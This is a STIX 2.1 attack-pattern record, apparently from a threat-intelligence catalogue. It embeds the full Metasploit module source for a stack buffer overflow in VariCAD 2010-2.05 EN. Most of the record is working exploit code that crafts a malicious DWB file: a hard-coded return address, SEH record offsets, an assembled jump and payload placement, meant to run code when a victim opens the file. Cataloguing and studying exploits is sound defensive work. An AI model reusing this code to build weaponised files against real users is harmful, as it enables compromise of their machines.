{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0e0d503-d7f7-4ea1-bd05-69d158d56f7b",
    "created": "2024-08-14T16:36:56.017399Z",
    "modified": "2024-08-14T16:36:56.017403Z",
    "name": "VariCAD 2010-2.05 EN (DWB File) Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in VariCAD 2010-2.05 EN. An attacker must send the file to victim and the victim must open the file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/varicad_dwb.rb",
            "external_id": "varicad_dwb.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VariCAD 2010-2.05 EN (DWB File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in VariCAD 2010-2.05 EN.\n        An attacker must send the file to victim and the victim must open the file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t     =>\n        [\n          'n00b',    # first public exploit\n          'dookie',  # metasploit first pass\n          'MC',      # cleanup pass 1 & second offset\n          'jduck'    # cleanup pass 2 & combined offsets\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '63067' ],\n          [ 'BID', '38815' ],\n          [ 'EDB', '11789' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x0a\\x3d\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x00401425 } ], #p/p/r in varicad-i386.exe\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-03-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.dwb']),\n      ])\n  end\n\n  def exploit\n\n    header = \"\\x34\\x87\\x01\\x00\\x00\\x00\\x00\\x00\\x25\\x5c\\x1f\\x85\"\n    sploit = rand_text_alpha_upper(1000) * 50\n\n    # Add SEH frames..\n    seh = generate_seh_record(target.ret)\n    offsets = [ 26252, 22856 ]\n    sploit[0,payload.encoded.length] = payload.encoded\n    offsets.each { |off|\n      sploit[off,seh.length] = seh\n      distance = seh.length + off\n      jmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n      sploit[off+seh.length,jmp.length] = jmp\n    }\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(header + sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-17",
    "x_mitre_platforms": [
        "win'"
    ]
}